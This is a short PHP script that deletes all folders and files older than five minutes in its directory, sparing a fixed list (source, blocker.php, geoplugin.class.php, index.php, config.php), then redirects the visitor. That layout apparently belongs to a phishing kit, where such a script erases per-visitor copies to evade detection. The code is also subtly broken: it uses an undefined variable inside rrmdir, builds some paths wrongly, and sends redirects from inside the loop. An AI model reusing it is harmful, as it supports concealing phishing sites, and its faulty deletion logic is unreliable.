<?php
include 'config.php';
$files = glob(getcwd().'/*'); // get all file names
	foreach($files as $file){ // iterate files
	  	if(is_dir($file)) {
			if($file==getcwd().'/source'  || $file==getcwd().'/empty_files') {
				// do nothing
			}
			else {
//check time
if (filemtime($file) < time() - 300) {
 
  rrmdir($file);
}
				
			}
		}
		
		else if(is_file($file)) {
			if($file==getcwd().'.htaccess' || $file==getcwd().'/blocker.php' || 
			$file==getcwd().'/delete.php' || $file==getcwd().'/error_log' || 
			$file==getcwd().'/geoplugin.class.php' || $file==getcwd().'/index.php' ||
			$file==getcwd().'/config.php' || 
			$file==getcwd().'/robots.txt') {
				// do nothing
			}
			else {
//check time
if (filemtime($file) < time() - 300) {

	    			unlink(getcwd().'/'.$file);
			header("Location: $redirect");}
			}
		}
	}
	function rrmdir($dir) { 
		if (is_dir($dir)) { 
			$objects = scandir($dir); 
			foreach ($objects as $object) { 
				if ($object != "." && $object != "..") { 
					if (is_dir($dir."/".$object))
						rrmdir($dir."/".$object);
					else
						unlink($dir."/".$object); 
				} 
			}
			//check time
if (filemtime($file) < time() - 300) {
rmdir($dir); }
		} 
	}
header("Location: $redirect");
?>
